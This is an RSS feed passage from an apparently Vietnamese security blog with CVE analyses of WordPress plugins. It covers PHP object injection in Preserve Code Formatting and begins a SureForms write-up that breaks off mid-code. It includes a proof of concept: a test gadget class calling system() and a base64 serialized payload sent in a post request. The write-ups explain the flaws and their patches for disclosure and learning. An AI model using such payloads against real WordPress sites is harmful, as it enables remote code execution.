&amp;#34;/(\{\!\{{$tag}[^\]]*\}\!\}.*\{\!\{\/{$tag}\}\!\})/Us&amp;#34;,&#xA;    $content,&#xA;    -1,&#xA;    PREG_SPLIT_DELIM_CAPTURE&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bi·ªÉu th·ª©c ch√≠nh quy tr√™n d√πng ƒë·ªÉ t√¨m ƒëo·∫°n m·ªü th·∫ª &lt;code&gt;{!{$tag}...}!}&lt;/code&gt; v√† ƒë√≥ng th·∫ª &lt;code&gt;{!{/$tag}!}&lt;/code&gt; c√πng n·ªôi dung b√™n trong. Tham s·ªë &lt;code&gt;PREG_SPLIT_DELIM_CAPTURE&lt;/code&gt; gi√∫p gi·ªØ l·∫°i c·∫£ ƒëo·∫°n kh·ªõp trong m·∫£ng k·∫øt qu·∫£.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-20-cve-2025-49386/tag.png&#34; title=&#34;Gi√° tr·ªã c·ªßa $tag&#34; data-thumbnail=&#34;/posts/2025-11-20-cve-2025-49386/tag.png&#34; data-sub-html=&#34;&lt;h2&gt;Tag&lt;/h2&gt;&lt;p&gt;Gi√° tr·ªã c·ªßa $tag&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-20-cve-2025-49386/tag.png&#39; alt=&#34;Tag&#34; height=&#34;509&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Gi√° tr·ªã c·ªßa $tag&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;N·∫øu &lt;code&gt;$tag&lt;/code&gt; l√† &lt;code&gt;code&lt;/code&gt; ho·∫∑c &lt;code&gt;pre&lt;/code&gt; th√¨ s·∫Ω t√°ch ƒë∆∞·ª£c c√°c kh·ªëi preserve, c√≤n n·∫øu kh√¥ng kh·ªõp th√¨ k·∫øt qu·∫£ tr·∫£ v·ªÅ ch·ªâ l√† ch√≠nh chu·ªói &lt;code&gt;$content&lt;/code&gt; ban ƒë·∫ßu.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( preg_match( &amp;#34;/\\{\\!\\{({$tag}[^\\]]*)\\}\\!\\}(.*)\\{\\!\\{\\/{$tag}\\}\\!\\}/Us&amp;#34;, $code, $match ) ) { ... }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;preg_match()&lt;/code&gt; ki·ªÉm tra xem &lt;code&gt;$code&lt;/code&gt; c√≥ ch·ª©a th·∫ª preserve m·ªü &lt;code&gt;{!{$tag}...}!}&lt;/code&gt; v√† ƒë√≥ng &lt;code&gt;{!{/{$tag}}!}&lt;/code&gt; hay kh√¥ng. N·∫øu kh·ªõp, &lt;code&gt;$match[1]&lt;/code&gt; l√† t√™n th·∫ª/thu·ªôc t√≠nh, &lt;code&gt;$match[2]&lt;/code&gt; l√† n·ªôi dung b√™n trong.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-20-cve-2025-49386/match.png&#34; title=&#34;Gi√° tr·ªã c·ªßa $match&#34; data-thumbnail=&#34;/posts/2025-11-20-cve-2025-49386/match.png&#34; data-sub-html=&#34;&lt;h2&gt;Match&lt;/h2&gt;&lt;p&gt;Gi√° tr·ªã c·ªßa $match&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-20-cve-2025-49386/match.png&#39; alt=&#34;Match&#34; height=&#34;615&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Gi√° tr·ªã c·ªßa $match&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$data = unserialize( str_replace( $this-&amp;gt;chunk_split_token, &amp;#39;&amp;#39;, stripslashes( base64_decode( $match[2] ) ) ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cu·ªëi c√πng, gi√° tr·ªã c·ªßa &lt;code&gt;$match[2]&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c decode base64, lo·∫°i b·ªè k√Ω t·ª± escape b·∫±ng &lt;code&gt;stripslashes()&lt;/code&gt;, x√≥a token v√† &lt;code&gt;unserialize()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Th√¥ng tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;ƒê√∫ng v·ªõi m√¥ t·∫£ c·ªßa CVE, ƒë·ªÉ khai th√°c ta c·∫ßn ƒë·∫∑c quy·ªÅn &lt;strong&gt;Contributor&lt;/strong&gt; d√†nh cho vi·ªác t·∫°o b√†i vi·∫øt.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Contributor submits Post&#xA;(Content contains malicious Base64 payload)&amp;#34;]&#xA;    --&amp;gt; B[&amp;#34;WordPress calls hook: content_save_pre&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Plugin callback: preserve_postprocess()&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Regex extracts preserve blocks&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;match[2] = Base64 payload&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;base64_decode()&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;stripslashes()&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;str_replace(chunk_split_token)&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;unserialize() on user data (VULNERABLE)&amp;#34;]&#xA;&#xA;I --&amp;gt; J[RCE]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;T·∫°o class ƒë·ªÉ test ƒë·∫∑t trong &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Evil&#xA;{&#xA;    public $command = &amp;#34;ls /&amp;#34;;&#xA;    public function __destruct()&#xA;    {&#xA;        die(system($this-&amp;gt;command));&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;T·∫°o post, cho request ƒëi qua proxy c·ªßa BurpSuite&lt;/li&gt;&#xA;&lt;li&gt;G·ª≠i l·∫°i request v·ªõi &lt;code&gt;&amp;quot;content&amp;quot;&lt;/code&gt; l√† chu·ªói serialized ƒë∆∞·ª£c encode base64&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&amp;#34;id&amp;#34;:129,&amp;#34;content&amp;#34;:&amp;#34;{!{code}!}Tzo0OiJFdmlsIjoxOntzOjc6ImNvbW1hbmQiO3M6NDoibHMgLyI7fQ=={!{/code}!}&amp;#34;,&amp;#34;title&amp;#34;:&amp;#34;Test&amp;#34;,&amp;#34;status&amp;#34;:&amp;#34;pending&amp;#34;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-20-cve-2025-49386/result.png&#34; title=&#34;K·∫øt qu·∫£&#34; data-thumbnail=&#34;/posts/2025-11-20-cve-2025-49386/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-20-cve-2025-49386/result.png&#39; alt=&#34;Result&#34; height=&#34;841&#34; width=&#34;1479&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;Phi√™n b·∫£n &lt;code&gt;&amp;lt;= 4.0.1&lt;/code&gt; c·ªßa plugin Preserve Code Formatting m·∫Øc l·ªói nghi√™m tr·ªçng khi s·ª≠ d·ª•ng &lt;code&gt;unserialize()&lt;/code&gt; tr√™n d·ªØ li·ªáu ƒë·∫ßu v√†o kh√¥ng ƒë∆∞·ª£c x√°c th·ª±c, cho ph√©p ƒë·ªëi t∆∞·ª£ng PHP t√πy √Ω ƒë∆∞·ª£c kh·ªüi t·∫°o trong qu√° tr√¨nh x·ª≠ l√Ω n·ªôi dung b√†i vi·∫øt. Ch·ªâ c·∫ßn quy·ªÅn Contributor, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë∆∞a payload v√†o n·ªôi dung post, d·∫´n ƒë·∫øn th·ª±c thi m√£ t·ª´ xa ho·∫∑c thao t√°c tr√°i ph√©p tr√™n h·ªá th·ªëng. B·∫£n v√° &lt;code&gt;v5.0&lt;/code&gt; ƒë√£ lo·∫°i b·ªè ho√†n to√†n vi·ªác d√πng &lt;code&gt;unserialize()&lt;/code&gt;, thay th·∫ø b·∫±ng &lt;code&gt;json_decode()&lt;/code&gt; v√† b·ªï sung b∆∞·ªõc ki·ªÉm tra t√≠nh an to√†n, t·ª´ ƒë√≥ tri·ªát ti√™u l·ªó h·ªïng Object Injection.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;unserialize()&lt;/code&gt; tr√™n d·ªØ li·ªáu ng∆∞·ªùi d√πng l√† nguy c∆° b·∫£o m·∫≠t nghi√™m tr·ªçng n·∫øu kh√¥ng ƒë∆∞·ª£c x√°c th·ª±c.&lt;/li&gt;&#xA;&lt;li&gt;Hook &lt;code&gt;content_save_pre&lt;/code&gt; t·∫°o ra b·ªÅ m·∫∑t t·∫•n c√¥ng v√¨ d·ªØ li·ªáu ch∆∞a ƒë∆∞·ª£c l·ªçc khi ƒëi v√†o h√†m x·ª≠ l√Ω.&lt;/li&gt;&#xA;&lt;li&gt;Quy·ªÅn Contributor ƒë·ªß ƒë·ªÉ k√≠ch ho·∫°t khai th√°c, m·ª©c ƒë·ªô r·ªßi ro cao tr√™n m√¥i tr∆∞·ªùng ƒëa user.&lt;/li&gt;&#xA;&lt;li&gt;B·∫£n v√° t·∫≠p trung v√†o thay ƒë·ªïi c∆° ch·∫ø x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o v√† th√™m x√°c th·ª±c ƒë·ªÉ lo·∫°i b·ªè kh·∫£ nƒÉng t·∫°o object t√πy √Ω.&lt;/li&gt;&#xA;&lt;li&gt;Vi·ªác thay th·∫ø &lt;code&gt;unserialize()&lt;/code&gt; b·∫±ng c∆° ch·∫ø an to√†n h∆°n nh∆∞ JSON l√† h∆∞·ªõng x·ª≠ l√Ω ƒë√∫ng cho c√°c plugin WordPress t∆∞∆°ng t·ª±.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/preserve-code-formatting/vulnerability/wordpress-preserve-code-formatting-plugin-4-0-1-php-object-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Preserve Code Formatting Plugin &amp;lt;= 4.0.1 is vulnerable to a high priority PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-6742 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-19-cve-2025-6742/</link>
      <pubDate>Wed, 19 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-19-cve-2025-6742/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;The SureForms ‚Äì Drag and Drop Form Builder for WordPress&lt;/strong&gt; cho WordPress t·ªìn t·∫°i l·ªó h·ªïng &lt;strong&gt;PHP Object Injection&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n cho ƒë·∫øn, v√† bao g·ªìm, 1.7.3 th√¥ng qua vi·ªác s·ª≠ d·ª•ng &lt;strong&gt;file_exists()&lt;/strong&gt; trong h√†m &lt;strong&gt;delete_entry_files()&lt;/strong&gt; m√† kh√¥ng c√≥ gi·ªõi h·∫°n ƒë·ªëi v·ªõi ƒë∆∞·ªùng d·∫´n ƒë∆∞·ª£c cung c·∫•p. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c c√≥ th·ªÉ inject m·ªôt &lt;strong&gt;PHP Object&lt;/strong&gt;. Kh√¥ng c√≥ &lt;strong&gt;POP chain&lt;/strong&gt; n√†o ƒë∆∞·ª£c bi·∫øt ƒë·∫øn trong ph·∫ßn m·ªÅm d·ªÖ b·ªã t·∫•n c√¥ng n√†y, nghƒ©a l√† l·ªó h·ªïng n√†y kh√¥ng c√≥ t√°c ƒë·ªông tr·ª´ khi m·ªôt plugin ho·∫∑c theme kh√°c ch·ª©a &lt;strong&gt;POP chain&lt;/strong&gt; ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n site. N·∫øu m·ªôt &lt;strong&gt;POP chain&lt;/strong&gt; t·ªìn t·∫°i th√¥ng qua plugin ho·∫∑c theme b·ªï sung ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n h·ªá th·ªëng m·ª•c ti√™u, n√≥ c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng th·ª±c hi·ªán c√°c h√†nh ƒë·ªông nh∆∞ x√≥a file t√πy √Ω, l·∫•y d·ªØ li·ªáu nh·∫°y c·∫£m, ho·∫∑c th·ª±c thi code t√πy thu·ªôc v√†o &lt;strong&gt;POP chain&lt;/strong&gt; hi·ªán di·ªán.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-6742&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-6742&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.7.3&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.7.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (7.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/sureforms/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress SureForm Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;SureForm&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.7.3&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.7.4&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Trong phi√™n b·∫£n &lt;code&gt;1.7.3&lt;/code&gt;, h√†m &lt;code&gt;delete_entry_files()&lt;/code&gt; nh·∫≠n v√†o m·ªôt &lt;code&gt;$file_url&lt;/code&gt;, sau ƒë√≥ decode url v√† chuy·ªÉn ƒë·ªïi th√†nh ƒë∆∞·ªùng d·∫´n b·∫±ng &lt;code&gt;$file_path = Helper::convert_fileurl_to_filepath( urldecode( $file_url ) );&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ti·∫øp theo n√≥ g·ªçi tr·ª±c ti·∫øp:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// Delete the file if it exists.&#xA;if ( file_exists( $file_path ) ) 